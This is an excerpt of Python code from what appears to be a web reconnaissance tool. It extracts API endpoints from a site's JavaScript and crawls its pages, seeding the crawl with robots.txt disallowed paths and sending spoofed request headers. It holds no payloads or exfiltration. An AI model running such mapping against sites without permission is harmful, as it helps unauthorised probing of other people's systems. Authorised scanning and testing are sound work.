async def extract_js_endpoints(
    client: httpx.AsyncClient,
    pages: List[str],
) -> List[str]:
    """
    Parse JavaScript source files loaded by the pages to discover API endpoints.
    """
    endpoints: Set[str] = set()
    js_urls: Set[str] = set()
    sem = asyncio.Semaphore(10)
    
    # Patterns to find URLs in JS code
    url_patterns = [
        r"""(?:fetch|axios\.get|axios\.post|axios\.put|axios\.delete|XMLHttpRequest)\s*\(\s*['"`]([^'"`\s]+)['"`]""",
        r"""['"`](\/api\/[^'"`\s]+)['"`]""",
        r"""['"`](\/[a-zA-Z0-9_\-\/]+\?[^'"`\s]+)['"`]""",
        r"""(?:url|endpoint|path|route|href)\s*[:=]\s*['"`]([^'"`\s]+)['"`]""",
    ]
    
    async def extract_from_page(page_url: str):
        async with sem:
            try:
                resp = await client.get(page_url, headers=get_spoofed_headers(),
                                         follow_redirects=True, timeout=httpx.Timeout(8.0))
                soup = BeautifulSoup(resp.text, "html.parser")
                base = get_base_url(str(resp.url))
                
                # Collect JS file URLs
                for script in soup.find_all("script", src=True):
                    src = script["src"]
                    full_url = urljoin(str(resp.url), src)
                    if full_url.startswith(base):
                        js_urls.add(full_url)
                
                # Also check inline scripts
                for script in soup.find_all("script"):
                    if script.string:
                        for pattern in url_patterns:
                            for match in re.finditer(pattern, script.string):
                                ep = match.group(1)
                                if ep.startswith("/"):
                                    endpoints.add(urljoin(base, ep))
            except Exception:
                pass
    
    await asyncio.gather(*[extract_from_page(p) for p in pages[:15]])
    
    # Now fetch and parse JS files
    async def parse_js_file(js_url: str):
        async with sem:
            try:
                resp = await client.get(js_url, headers=get_spoofed_headers(),
                                         timeout=httpx.Timeout(8.0))
                base = get_base_url(js_url)
                for pattern in url_patterns:
                    for match in re.finditer(pattern, resp.text):
                        ep = match.group(1)
                        if ep.startswith("/"):
                            endpoints.add(urljoin(base, ep))
            except Exception:
                pass
    
    if js_urls:
        await asyncio.gather(*[parse_js_file(u) for u in list(js_urls)[:20]])
    
    return list(endpoints)


# ─── Spider / Crawler ─────────────────────────────────────────────────────────

async def spider_all_pages(client: httpx.AsyncClient, start_url: str, deep: bool) -> List[str]:
    """Spider the site concurrently and return all unique page URLs."""
    base = get_base_url(start_url)
    visited: set = set()
    max_pages = 60 if deep else 15
    spider_sem = asyncio.Semaphore(10)

    # Seed queue with robots.txt extras
    seed = [start_url]
    try:
        r = await client.get(f"{base}/robots.txt", headers=get_spoofed_headers(), timeout=httpx.Timeout(5.0))
        for line in r.text.splitlines():
            if line.lower().startswith(("allow:", "disallow:")):
                path = line.split(":", 1)[1].strip()
                if path and path != "/" and "*" not in path:
                    seed.append(urljoin(base, path))
    except Exception:
        pass

    async def fetch_links(url: str) -> List[str]:
        async with spider_sem:
            try:
                resp = await client.get(url, headers=get_spoofed_headers(), follow_redirects=True,
                                        timeout=httpx.Timeout(8.0))
                soup = BeautifulSoup(resp.text, "html.parser")
                links = []
                for a in soup.find_all("a", href=True):
                    href = urljoin(str(resp.url), a["href"])
                    if href.startswith(base) and "#" not in href:
                        links.append(href.split("?")[0] if "?" not in a["href"] else href)
                return links
            except Exception:
                return []

    queue = list(set(seed[:max_pages]))
    while queue and len(visited) < max_pages:
        batch = [u for u in queue[:10] if u not in visited]
        queue = queue[10:]
        for u in batch:
            visited.add(u)
        results = await asyncio.gather(*[fetch_links(u) for u in batch])
        for links in results:
            for link in links:
                if link not in visited and len(visited) < max_pages:
                    queue.append(link)

    return list(visited)


